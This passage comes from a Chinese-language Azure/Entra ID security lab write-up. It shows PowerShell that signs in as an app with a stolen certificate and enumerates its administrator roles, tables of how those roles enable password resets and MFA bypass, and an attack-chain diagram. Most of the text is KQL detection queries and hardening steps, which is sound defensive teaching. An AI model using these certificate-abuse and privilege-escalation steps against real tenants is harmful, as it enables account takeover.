    Write-Host "`n匹配成功!" -ForegroundColor Green
    Write-Host "  应用名称: $($matchedApp.displayName)" -ForegroundColor White
    Write-Host "  应用 ID: $($matchedApp.appId)" -ForegroundColor White
    Write-Host "  对象 ID: $($matchedApp.id)" -ForegroundColor White

    # 保存应用信息
    $GeologyAppId = $matchedApp.appId
    $GeologyAppObjectId = $matchedApp.id
} else {
    Write-Host "`n未找到匹配的应用" -ForegroundColor Red
    Write-Host "尝试通过 Graph API 查询..." -ForegroundColor Yellow

    # 备选方案：直接查询 Graph API
    Connect-MgGraph -Scopes "Application.Read.All"
    $apps = Get-MgApplication -All

    foreach ($app in $apps) {
        foreach ($keyCred in $app.KeyCredentials) {
            if ($keyCred.CustomKeyIdentifier -eq $certThumbprint) {
                Write-Host "找到匹配的应用: $($app.DisplayName)" -ForegroundColor Green
                $GeologyAppId = $app.AppId
                $GeologyAppObjectId = $app.Id
                break
            }
        }
    }
}

# 4. 使用证书登录
Write-Host "`n使用证书登录 GeologyApp..." -ForegroundColor Cyan

# 创建证书凭据
$certCredential = New-Object System.Management.Automation.PSCredential(
    $GeologyAppId,
    (ConvertTo-SecureString -String $certPassword -AsPlainText -Force)
)

# 使用证书连接 Microsoft Graph
try {
    Connect-MgGraph -ClientId $GeologyAppId -TenantId $TenantId -CertificateThumbprint $certThumbprint
    Write-Host "✅ 登录成功!" -ForegroundColor Green

    $currentContext = Get-MgContext
    Write-Host "  当前应用: $($currentContext.ClientId)" -ForegroundColor White
    Write-Host "  租户: $($currentContext.TenantId)" -ForegroundColor White

} catch {
    Write-Host "❌ 登录失败: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# 5. 枚举应用权限
Write-Host "`n枚举 GeologyApp 的权限..." -ForegroundColor Cyan

# 查询服务主体
$servicePrincipal = Get-MgServicePrincipal -Filter "appId eq '$GeologyAppId'"

# 显示应用权限
Write-Host "`n应用程序权限:" -ForegroundColor Yellow
if ($servicePrincipal.AppRoles) {
    foreach ($role in $servicePrincipal.AppRoles) {
        Write-Host "  - $($role.DisplayName) [$($role.Id)]" -ForegroundColor White
        Write-Host "    描述: $($role.Description)" -ForegroundColor Gray
    }
}

# 显示 API 权限
Write-Host "`nAPI 权限:" -ForegroundColor Yellow
$oauth2PermissionGrants = Get-MgOauth2PermissionGrant -All | Where-Object { $_.ClientId -eq $servicePrincipal.Id }
foreach ($grant in $oauth2PermissionGrants) {
    Write-Host "  资源: $($grant.ResourceId)" -ForegroundColor White
}
```

#### 预期结果

```
证书指纹: A1B2C3D4E5F6789012345678901234567890ABCD

匹配成功!
  应用名称: GeologyApp
  应用 ID: 23456789-abcd-1234-abcd-1234567890ab
  对象 ID: 22222222-bbbb-cccc-dddd-eeeeeeeeeeee

使用证书登录 GeologyApp...
✅ 登录成功!
  当前应用: 23456789-abcd-1234-abcd-1234567890ab
  租户: abcdef12-3456-7890-abcd-ef1234567890

枚举 GeologyApp 的权限...

应用程序权限:
  - Helpdesk Administrator
    描述: 可以重置非管理员用户的密码
  - Authentication Administrator
    描述: 可以修改用户的认证方法（如 MFA）
  - Application Administrator
    描述: 可以管理应用注册和服务主体
  - Directory Readers
    描述: 可以读取目录信息

API 权限:
  - Policy.Read.All
    描述: 可以读取条件访问策略等
```

#### 为什么这些权限很重要？

| 权限 | 危险等级 | 滥用场景 |
|------|---------|---------|
| **Helpdesk Administrator** | 🔴 高 | 重置任意用户密码，接管账户 |
| **Authentication Administrator** | 🔴 高 | 添加/删除 MFA，绕过双因素认证 |
| **Application Administrator** | 🔴 高 | 给应用添加后门，创建恶意应用 |
| **Policy.Read.All** | 🟡 中 | 读取安全策略，绕过检测 |

**攻击链延续**：
```
GeologyApp 权限
    ↓
Helpdesk Administrator
    ↓
重置域管理员密码
    ↓
域管理员权限 (Objective 4)
```

---

## 检测与防御

基于项目的 [EntraSyncAba.md](EntraSyncAba.md)、[IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) 和相关检测规则，以下是针对 ABAC 绕过攻击的检测与防御措施。

### 检测方法

#### 1. 异常标签修改检测

**检测逻辑**: 监控 Blob 标签的修改操作，特别关注在短时间内修改标签后立即读取文件的行为。

```kusto
// KQL 查询 - 适用于 Microsoft Sentinel / Microsoft Defender XDR
// 检测异常的 Blob 标签修改行为

AzureActivity
| where OperationName == "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write"
    or OperationName == "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags/write"
| where Category == "Storage"
| project TimeGenerated, Caller, CallerIpAddress, OperationName, ResourceGroupName
| summarize TagModificationCount = count() by Caller, bin(TimeGenerated, 5m)
| where TagModificationCount > 10  // 异常高频修改
| join kind=inner (
    AzureActivity
    | where OperationName == "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read"
    | where Category == "Storage"
    | project ReadTime = TimeGenerated, Caller, CallerIpAddress
) on Caller
| where abs(datetime_diff('minute', ReadTime, TimeGenerated)) < 5  // 修改后立即读取
| project TimeGenerated, Caller, CallerIpAddress, TagModificationCount, ReadTime
```

**检测文件位置**: [queries/EntraConnectABA/Added-Credentials.kusto](queries/EntraConnectABA/Added-Credentials.kusto)

#### 2. ABAC 绕过模式检测

**检测逻辑**: 检测文件被读取前标签被修改的模式。

```kusto
// 检测可能的 ABAC 绕过行为

let StorageAccountsWithABAC = materialize(
    RoleAssignments
    | where Condition != ""
    | where Condition contains "tags:"
    | project Scope, Condition
);

AzureActivity
| where OperationName == "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags/write"
| project TimeGenerated, Caller, CallerIpAddress, ResourceId
| join kind=inner (StorageAccountsWithABAC) on $left.ResourceId == $right.Scope
| project TimeGenerated, Caller, CallerIpAddress, ResourceId, Condition
| join kind=inner (
    AzureActivity
    | where OperationName == "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read"
    | project ReadTime = TimeGenerated, Caller, ResourceId
) on Caller, ResourceId
| where ReadTime > TimeGenerated
| where datetime_diff('minute', ReadTime, TimeGenerated) < 10
| project TimeGenerated, Caller, CallerIpAddress, Condition, TimeDiff = datetime_diff('minute', ReadTime, TimeGenerated)
```

#### 3. 服务主体异常活动检测

**检测逻辑**: 监控服务主体的异常登录和访问模式。

```kusto
// 检测文件位置: queries/EntraConnectABA/SignIn-EntraConnectAbaSuspiciousCredentialType.kusto

AADServicePrincipalSignInLogs
| where TimeGenerated > ago(14d)
| where AppId == "<Your_App_ID>"
| where ResultType == 0  // Successful sign-ins
| summarize
    SignInCount = count(),
    UniqueIPs = dcount(IPAddress),
    IPAddresses = make_set(IPAddress),
    Locations = make_set(Location)
    by bin(TimeGenerated, 1h), ServicePrincipalName, AppId
| where SignInCount > 100 or UniqueIPs > 2  // 异常活动
| project TimeGenerated, ServicePrincipalName, SignInCount, UniqueIPs, IPAddresses, Locations
| order by TimeGenerated desc
```

**检测文件位置**: [queries/EntraConnectABA/SignIn-EntraConnectAbaSuspiciousCredentialType.kusto](queries/EntraConnectABA/SignIn-EntraConnectAbaSuspiciousCredentialType.kusto)

#### 4. 证书盗窃检测

**检测逻辑**: 检测从非预期位置或使用异常方式登录的证书。

```kusto
// 检测文件位置: queries/EntraConnectABA/SignIn-NewCertificateOutsideOfAbaRotation.kusto

AADServicePrincipalSignInLogs
| where TimeGenerated > ago(7d)
| where AuthenticationProtocol == "ClientCertificate"
| project TimeGenerated, ServicePrincipalName, AppId, CertificateThumbprint, IPAddress, Location
| join kind=leftouter (
    // 证书轮换日志（需要集成 Entra Connect 审计日志）
    DeviceEvents
    | where ActionName == "RotateApplicationCertificate"
    | project CertificateThumbprint = parse_json(tostring(AdditionalFields)).CertificateThumbprint, RotationTime = TimeGenerated
) on CertificateThumbprint
| where isnull(RotationTime) or TimeGenerated < RotationTime
| project TimeGenerated, ServicePrincipalName, CertificateThumbprint, IPAddress, Location, RotationTime
```

**检测文件位置**: [queries/EntraConnectABA/SignIn-NewCertificateOutsideOfAbaRotation.kusto](queries/EntraConnectABA/SignIn-NewCertificateOutsideOfAbaRotation.kusto)

### 防御措施

基于项目的 [LateralMovementADEID.md](LateralMovementADEID.md) 和 [EntraSyncAba.md](EntraSyncAba.md)，以下是分层防御策略。

#### 基础防护措施

##### 1. 实施最小权限原则

**问题描述**: 过度许可是最大的安全漏洞。

**修复方案**:

```powershell
# 错误的权限配置
# Storage Blob Data Contributor 包含 tags/write 权限

# 正确的权限配置
# 使用 Storage Blob Data Reader，限制为只读
$RoleDefinitionName = "Storage Blob Data Reader"
$Scope = "/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{account}"

# 分配角色（只读权限）
New-AzRoleAssignment `
    -ObjectId $ObjectId `
    -RoleDefinitionName $RoleDefinitionName `
    -Scope $Scope
```

**权限对比**:

| 角色 | 包含权限 | 风险等级 |
|------|---------|---------|
| Storage Blob Data Contributor | read, write, delete, **tags/write** | 🔴 高 |
| Storage Blob Data Reader | **read only** | 🟢 低 |

##### 2. 使用托管标识替代服务主体

**优势**:
- 无需管理证书或机密
- 自动轮换凭据
- 与 Azure 资源生命周期绑定

```powershell
# 创建托管标识
$identity = New-AzUserAssignedIdentity -ResourceGroupName $rg -Name "MyManagedIdentity"

# 分配权限
New-AzRoleAssignment `
    -ObjectId $identity.PrincipalId `
    -RoleDefinitionName "Storage Blob Data Reader" `
    -Scope $storageScope
```

##### 3. 启用 Blob 版本控制和软删除

**作用**: 防止数据被恶意删除或覆盖。

```powershell
# 启用软删除
Update-AzStorageBlobServiceProperty `
    -ResourceGroupName $rg `
    -StorageAccountName $storageAccountName `
    -EnableChangeFeed $true `
    -IsVersioningEnabled $true `
    -EnableDeleteRetentionPolicy $true `
    -RetentionDays 30
```

##### 4. 配置存储账户防火墙

**作用**: 限制只有受信任的网络可以访问。

```powershell
# 配置网络规则
Update-AzStorageAccountNetworkRuleSet `
    -ResourceGroupName $rg `
    -Name $storageAccountName `
    -DefaultAction Deny `
    -Bypass AzureServices

# 添加允许的 IP
Add-AzStorageAccountNetworkRule `
    -ResourceGroupName $rg `
    -Name $storageAccountName `
    -IPAddressOrRange "203.0.113.0/24"
```

#### 高级防护措施

##### 1. 实施条件访问策略

**要求**: Entra ID P1/P2 或 Microsoft Entra Suite

**配置步骤**:

```powershell
# 使用条件访问限制服务主体访问
# 需要配置:
# 1. 命名位置（受信任的 IP 地址）
# 2. 位置策略（阻止来自未知位置的访问）
# 3. 风险策略（检测异常行为）
```

**详细配置参考**: [EntraSyncAba.md - Apply Conditional Access Policies](EntraSyncAba.md)

##### 2. 启用应用管理策略

**作用**: 阻止添加不安全的凭据类型。

```powershell
# 参考: EntraSyncAba.md - Enforce Application Management Policy

# 创建应用管理策略
Import-Module Microsoft.Graph.Identity.SignIns
Connect-MgGraph -Scopes Policy.ReadWrite.ApplicationConfiguration

$params = @{
    displayName = "Storage Account App Policy"
    isEnabled = $true
    restrictions = @{
        passwordCredentials = @(
            @{
                restrictionType = "passwordAddition"
                state = "enabled"
                maxLifetime = $null
            }
        )
    }
}

$AppManagementPolicy = New-MgPolicyAppManagementPolicy -BodyParameter $params

# 应用到目标应用
$ServicePrincipal = Get-MgServicePrincipal -Filter "appId eq '$AppId'"
$params = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/policies/appManagementPolicies/$($AppManagementPolicy.Id)"
} | ConvertTo-Json

Invoke-MgGraphRequest `
    -Method POST `
    -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($ServicePrincipal.Id)/appManagementPolicies/`$ref" `
    -Body $params
```

**详细配置参考**: [EntraSyncAba.md - Enforce Application Management Policy](EntraSyncAba.md#enforce-application-management-policy-to-block-client-secrets)

##### 3. 使用 Privileged Identity Management (PIM)

**作用**: 实施即时访问（Just-In-Time）权限。

```powershell
# 通过 Entra ID PIM 配置:
# 1. 将永久角色改为有资格角色
# 2. 要求激活才能使用
# 3. 设置激活时间限制
# 4. 要求审批或多重身份验证
```

#### 审计与监控

##### 1. 启用诊断日志

```powershell
# 为存储账户启用诊断日志
Set-AzDiagnosticSetting `
    -ResourceId $storageAccount.Id `
    -StorageAccountId $logWorkspace.ResourceId `
    -Enabled $true `
    -Categories @("StorageRead", "StorageWrite", "StorageDelete")
```

##### 2. 配置安全警报

基于 [AADSecurityConfigAnalyzer.md](AADSecurityConfigAnalyzer.md) 中的建议：

```powershell
# 部署 EIDSCA 解决方案
# 参考: AADSecurityConfigAnalyzer.md
# 配置文件: config/AadSecConfigV3.json
```

**检测规则模板位置**: [queries/](queries/) 目录

##### 3. 定期权限审计

```powershell
# 审计存储账户的 ABAC 条件
Get-AzRoleAssignment -Scope $storageScope |
    Where-Object { $_.Condition } |
    Select-Object RoleDefinitionName, Condition, ConditionVersion |
    Format-Table -AutoSize
```

---

## 参考资料

### 项目内文档

| 文档 | 位置 | 相关内容 |
|------|------|----------|
| Entra Connect ABA 攻击 | [EntraSyncAba.md](EntraSyncAba.md) | 应用认证滥用、检测与防御 |
| 横向移动防护 | [LateralMovementADEID.md](LateralMovementADEID.md) | AD 攻陷后的防护 |
| 身份安全监控 | [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) | 监控与检测框架 |
| 服务主体安全 | [ServicePrincipals-ADO.md](ServicePrincipals-ADO.md) | 服务主体安全 |
| EIDSCA 工具 | [AADSecurityConfigAnalyzer.md](AADSecurityConfigAnalyzer.md) | 安全配置分析 |

### 检测规则与查询

| 规则文件 | 位置 | 检测目标 |
|----------|------|----------|
| 新增凭据检测 | [queries/EntraConnectABA/Added-Credentials.kusto](queries/EntraConnectABA/Added-Credentials.kusto) | 检测凭据添加 |
| 可疑认证类型 | [queries/EntraConnectABA/SignIn-EntraConnectAbaSuspiciousCredentialType.kusto](queries/EntraConnectABA/SignIn-EntraConnectAbaSuspiciousCredentialType.kusto) | 检测异常认证方式 |
| 新证书检测 | [queries/EntraConnectABA/SignIn-NewCertificateOutsideOfAbaRotation.kusto](queries/EntraConnectABA/SignIn-NewCertificateOutsideOfAbaRotation.kusto) | 检测证书盗窃 |
| 令牌获取检测 | [queries/EntraConnectABA/TokenAcquisition-OutsideOfEntraConnectServer.kusto](queries/EntraConnectABA/TokenAcquisition-OutsideOfEntraConnectServer.kusto) | 检测异常令牌获取 |
| 服务器识别 | [queries/EntraConnectABA/Identify-EntraConnectServers.kusto](queries/EntraConnectABA/Identify-EntraConnectServers.kusto) | 识别 Entra Connect 服务器 |

### 攻击脚本

| 脚本 | 位置 | 功能 |
|------|------|------|
| 后门脚本 | [scripts/EntraConnectABA/Invoke-EntraConnectAppAuthBackdoor.ps1](scripts/EntraConnectABA/Invoke-EntraConnectAppAuthBackdoor.ps1) | 自动化攻击模拟 |

### 配置文件

| 文件 | 位置 | 用途 |
|------|------|------|
| 安全配置基线 | [config/AadSecConfigV3.json](config/AadSecConfigV3.json) | Entra ID 安全配置 |
| 权限授予策略 | [config/permissionGrantPolicies.json](config/permissionGrantPolicies.json) | 权限授予配置 |
| 规则模板 | [config/ruletemplates/](config/ruletemplates/) | 检测规则模板 |

### MITRE ATT&CK 映射

项目的 [media/mitre/AttackScenarios/](media/mitre/AttackScenarios/) 目录包含详细的攻击场景映射：

- [EIDC-8.json](media/mitre/AttackScenarios/EIDC-8.json) - Entra Connect ABA 攻击场景
- [Attacks_Combined.json](media/mitre/AttackScenarios/Attacks_Combined.json) - 综合攻击图

### 外部参考资料

#### 官方文档

| 主题 | 链接 |
|------|------|
| Azure Storage ABAC | [Authorize access to blobs using Azure role assignment conditions](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-auth-abac) |
| Blob Index Tags | [Manage and find Azure Blob data with blob index tags](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-manage-find-blobs-blob-index-tags) |
| 存储操作参考 | [Actions and data actions reference for Azure Storage](https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftstorage) |
| Entra ID 内置角色 | [Microsoft Entra built-in roles](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference) |
| 应用认证 | [Certificate Credentials - Microsoft Identity Platform](https://learn.microsoft.com/en-us/entra/identity-platform/certificate-credentials) |

#### 安全研究

| 主题 | 来源 |
|------|------|
| Entra Connect 攻击 | [SpecterOps - Dumping Entra Connect Sync Credentials](https://specterops.io/blog/2025/06/09/update-dumping-entra-connect-sync-credentials/) |
| 服务主体安全 | [SecureCloud.blog](https://securecloud.blog/) |
| AADInternals 工具 | [AADInternals.com](https://aadinternals.com) |
| Azure 权限提升 | [Azure Privilege Escalation via API Permissions Abuse](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48) |

---

## 总结

### 攻击链回顾

```
┌─────────────────────────────────────────────────────────────────────┐
│                    完整攻击链总结                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  起点: 低权限用户 Thomas                                            │
│       ↓                                                             │
│  Objective 1: 获取 GISApp 证书                                      │
│       ↓                                                             │
│  Objective 2: 滥用 Key Vault 签名 → DataAnalyticsApp                │
│       ↓                                                             │
│  Objective 3: [本文档重点]                                          │
│       ├── 发现 ABAC 条件                                            │
│       ├── 修改 Blob 标签绕过 ABAC                                   │
│       ├── 窃取 GeologyApp 证书                                      │
│       └── 权限提升到高权限应用                                       │
│       ↓                                                             │
│  终点: Helpdesk Admin / Auth Admin 权限                             │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 关键安全教训

1. **ABAC 配置不当是严重漏洞**: 限制"读"但放"写标签"等于没有限制
2. **过度许可是最大风险**: Storage Blob Data Contributor 包含了过多权限
3. **证书需要妥善保护**: 存储在存储账户中的证书应该加密
4. **审计与监控至关重要**: 需要监控标签修改和异常读取行为

### 防御优先级

| 优先级 | 措施 | 影响 | 实施难度 |
|--------|------|------|----------|
| **高** | 移除不必要的 tags/write 权限 | 直接阻止 ABAC 绕过 | 低 |
| **高** | 实施存储账户网络隔离 | 阻止外部访问 | 中 |
| **高** | 启用 Blob 软删除和版本控制 | 防止数据丢失 | 低 |
| **中** | 部署 ABAC 绕过检测规则 | 快速发现异常 | 中 |
| **中** | 使用托管标识替代服务主体 | 简化凭据管理 | 中 |
| **低** | 实施 PIM 即时访问 | 减少权限暴露时间 | 高 |

### 下一步学习

完成本实验后，建议继续学习：
- [target4.md](target4.md): 利用高权限应用进行进一步攻击
- [LateralMovementADEID.md](LateralMovementADEID.md): 防止横向移动
- [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md): 建立全面的安全监控

---

> **文档版本历史**
> - v2.0 (2025-01): 基于项目资料全面优化，增加理论基础、防御措施和参考资料
> - v1.0 (初始版): 基于 PDF 文档的基础实验步骤
